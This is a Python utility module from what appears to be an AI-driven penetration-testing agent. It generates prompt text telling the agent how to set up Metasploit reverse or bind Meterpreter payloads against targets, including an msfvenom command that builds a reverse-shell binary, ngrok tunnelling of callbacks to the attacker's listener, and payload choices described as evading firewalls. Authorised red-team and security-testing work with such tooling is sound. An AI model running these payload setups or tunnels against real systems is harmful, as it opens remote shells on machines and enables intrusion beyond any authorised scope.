"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

import logging

from project_settings import get_setting
from orchestrator_helpers import get_checkpointer

logger = logging.getLogger(__name__)


def get_session_count() -> int:
    """Get total number of active sessions."""
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic (3-way):
        REVERSE: LHOST set AND LPORT set  → clear reverse intent
        BIND:    LHOST empty AND LPORT empty AND BIND_PORT set → clear bind intent
        ASK:     anything else (discordant or all empty) → agent must ask user

    When NGROK_TUNNEL_ENABLED is True, the agent queries the ngrok API to
    auto-discover the public tunnel URL, overriding LHOST and LPORT.

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # Fetch settings: empty string / None = "not set"
    LHOST = get_setting('LHOST', '') or None
    LPORT = get_setting('LPORT')
    BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET')
    PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)
    NGROK_TUNNEL_ENABLED = get_setting('NGROK_TUNNEL_ENABLED', False)

    # -------------------------------------------------------------------------
    # NGROK TUNNEL: auto-discover public URL if enabled
    # -------------------------------------------------------------------------
    ngrok_active = False
    ngrok_error = None
    ngrok_hostname = None
    if NGROK_TUNNEL_ENABLED:
        tunnel_info = _query_ngrok_tunnel()
        if tunnel_info:
            LHOST = tunnel_info['host']
            LPORT = tunnel_info['port']
            ngrok_hostname = tunnel_info.get('hostname')
            ngrok_active = True
        else:
            ngrok_error = ("ngrok tunnel enabled but API unreachable "
                           "— falling back to configured LHOST/LPORT")

    # -------------------------------------------------------------------------
    # 3-WAY DECISION: reverse / bind / ask user
    # -------------------------------------------------------------------------
    has_lhost = bool(LHOST)
    has_lport = LPORT is not None and LPORT > 0
    has_bind_port = BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    if has_lhost and has_lport:
        mode = "reverse"
    elif not has_lhost and not has_lport and has_bind_port:
        mode = "bind"
    else:
        mode = "ask"

    lines = []
    lines.append("### Pre-Configured Payload Settings")
    lines.append("")

    # -------------------------------------------------------------------------
    # NGROK STATUS BANNER (if enabled)
    # -------------------------------------------------------------------------
    if NGROK_TUNNEL_ENABLED:
        if ngrok_active:
            lines.append(f"**ngrok Tunnel: ACTIVE** — public endpoint `{LHOST}:{LPORT}`")
            lines.append("The Metasploit listener runs locally on kali-sandbox:4444.")
            lines.append("The target connects to the ngrok public URL, which tunnels traffic to your listener.")
            lines.append("")
            lines.append("**CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https). "
                         "NEVER use bind payloads — bind mode cannot work through an ngrok tunnel "
                         "because ngrok only forwards inbound connections to the local listener.**")
            lines.append("")
        elif ngrok_error:
            lines.append(f"**ngrok Tunnel: ERROR** — {ngrok_error}")
            lines.append("")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if mode == "reverse":
        # =====================================================================
        # REVERSE PAYLOAD: Target connects TO attacker (LHOST:LPORT)
        # =====================================================================
        lines.append("**Mode: REVERSE** (target connects to you)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│   TARGET    │ ───connects to───► │  ATTACKER   │")
        lines.append(f"│             │                    │ {LHOST}:{LPORT} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")

        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines.append(f"**Payload type:** `{conn_type}` ({reason})")
        lines.append("")
        lines.append("**IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
        lines.append("```")
        lines.append("show targets")
        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter reverse payload from `show payloads`:**")
        lines.append("")
        lines.append(f"Look for payloads with `meterpreter/{conn_type}` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append(f"- `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)")
        lines.append(f"- `linux/*/meterpreter/{conn_type}` for Linux native binaries")
        lines.append(f"- `windows/*/meterpreter/{conn_type}` for Windows targets")
        lines.append("")
        if ngrok_active:
            lines.append("**IMPORTANT: ngrok tunnel is active — REVERSE payloads ONLY!**")
            lines.append("")
            lines.append("**⚠️ STAGELESS PAYLOADS REQUIRED WITH NGROK!**")
            lines.append("Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through ngrok — "
                         "the stage transfer gets corrupted by the tunnel proxy and the session dies instantly.")
            lines.append("You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):")
            lines.append("")
            lines.append("| BROKEN (staged `/`) | USE THIS (stageless `_`) |")
            lines.append("|---------------------|--------------------------|")
            lines.append(f"| `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |")
            lines.append(f"| `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |")
            lines.append(f"| `cmd/unix/python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |")
            lines.append("")
            lines.append("There are TWO different LHOST/LPORT values — do NOT confuse them:")
            lines.append("")
            lines.append(f"| Purpose | LHOST | LPORT |")
            lines.append(f"|---------|-------|-------|")
            lines.append(f"| **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |")
            lines.append(f"| **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |")
            lines.append(f"| **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |")
            lines.append("")
            lines.append("ngrok forwards `{0}:{1}` → `127.0.0.1:4444` inside kali-sandbox.".format(LHOST, LPORT))
            lines.append("")
            lines.append("**Metasploit handler commands (inside msfconsole):**")
            lines.append("```")
            lines.append(f"set PAYLOAD <chosen_STAGELESS_reverse_payload>")
            lines.append(f"set LHOST {LHOST}")
            lines.append(f"set LPORT {LPORT}")
            lines.append("set ReverseListenerBindAddress 127.0.0.1")
            lines.append("set ReverseListenerBindPort 4444")
            lines.append("set AutoVerifySession false")
            lines.append("set DisablePayloadHandler false")
            lines.append("```")
            lines.append("")
            lines.append("**For msfvenom standalone payloads:**")
            lines.append(f"`msfvenom -p linux/x64/meterpreter_{conn_type} LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`")
            lines.append("")
            lines.append("**For shell one-liners (NO-MODULE FALLBACK only):**")
            lines.append(f"Use `LHOST={LHOST}` and `LPORT={LPORT}` (the ngrok public endpoint).")
            lines.append("The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.")
        else:
            lines.append("**Metasploit commands:**")
            lines.append("```")
            lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
            lines.append(f"set LHOST {LHOST}")
            lines.append(f"set LPORT {LPORT}")
            lines.append("```")
        lines.append("")
        lines.append("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif mode == "bind":
        # =====================================================================
        # BIND PAYLOAD: Attacker connects TO target (RHOST:BIND_PORT)
        # =====================================================================
        lines.append("**Mode: BIND** (you connect to target)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│  ATTACKER   │ ───connects to───► │   TARGET    │")
        lines.append(f"│    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter bind payload from `show payloads`:**")
        lines.append("")
        lines.append("Look for payloads with `meterpreter/bind_tcp` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append("- `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)")
        lines.append("- `linux/*/meterpreter/bind_tcp` for Linux native binaries")
        lines.append("- `windows/*/meterpreter/bind_tcp` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        lines.append(f"set LPORT {BIND_PORT_ON_TARGET}")
        lines.append("```")
        lines.append("")
        lines.append("**Note:** NO LHOST needed for bind payloads!")
        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for connection.")

    else:
        # =====================================================================
        # ASK USER: settings are empty or discordant
        # =====================================================================
        lines.append("⚠️ **PAYLOAD DIRECTION NOT CONFIGURED - ASK USER BEFORE EXPLOITING!**")
        lines.append("")
        # Show what's currently set so the agent can explain the problem
        lines.append("**Current settings:**")
        lines.append(f"- LHOST (Attacker IP): `{LHOST or 'empty'}`")
        lines.append(f"- LPORT (Attacker Port): `{LPORT or 'empty'}`")
        lines.append(f"- Bind Port on Target: `{BIND_PORT_ON_TARGET or 'empty'}`")
        lines.append("")
        if NGROK_TUNNEL_ENABLED and ngrok_error:
            lines.append("**Problem:** ngrok tunnel is enabled but the tunnel API is unreachable.")
            lines.append("The user intended to use a REVERSE payload through ngrok, but the tunnel is not running.")
            lines.append("Ask the user to check that `NGROK_AUTHTOKEN` is set in `.env` and the kali-sandbox container was restarted.")
        elif has_lhost and not has_lport:
            lines.append("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
        elif has_lport and not has_lhost:
            lines.append("**Problem:** LPORT is set but LHOST is missing. For reverse payloads, both are required.")
        else:
            lines.append("**Problem:** No payload direction is configured.")
        lines.append("")
        lines.append("**Use `action: \"ask_user\"` to ask which payload mode to use:**")
        lines.append("")
        lines.append("1. **REVERSE** (target connects back to you):")
        lines.append("   - Requires: LHOST (your IP) + LPORT (listening port)")
        lines.append("")
        lines.append("2. **BIND** (you connect to target):")
        lines.append("   - Requires: Bind port on target (e.g. 4444)")

    lines.append("")
    lines.append("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)


def _query_ngrok_tunnel() -> dict | None:
    """
    Query the ngrok API to get the public TCP tunnel URL.

    ngrok runs inside kali-sandbox and exposes its API at
    http://kali-sandbox:4040/api/tunnels within the Docker network.

    The hostname is returned as-is (not pre-resolved) because the agent
    container's DNS may resolve ngrok TCP relay hostnames to a different
    IP than the actual relay server.  The target will resolve the hostname
    through its own DNS, which returns the correct IP.

    Returns:
        Dict with 'host' (str — ngrok hostname), 'port' (int), and
        'hostname' (str — same as host) if a TCP tunnel is found,
        or None if ngrok is unreachable or no tunnel exists.
    """
    import requests

    try:
        resp = requests.get("http://kali-sandbox:4040/api/tunnels", timeout=5)
        resp.raise_for_status()
        data = resp.json()

        for tunnel in data.get("tunnels", []):
            if tunnel.get("proto") == "tcp":
                public_url = tunnel["public_url"]  # e.g. "tcp://0.tcp.ngrok.io:12345"
                addr = public_url.replace("tcp://", "")
                hostname, port_str = addr.rsplit(":", 1)
                port = int(port_str)

                logger.info(
                    f"ngrok TCP tunnel: {hostname}:{port}"
                )
                return {
                    "host": hostname,
                    "port": port,
                    "hostname": hostname,
                }

        logger.warning("ngrok API returned no TCP tunnels")
        return None

    except Exception as e:
        logger.warning(f"Failed to query ngrok tunnel API: {e}")
        return None
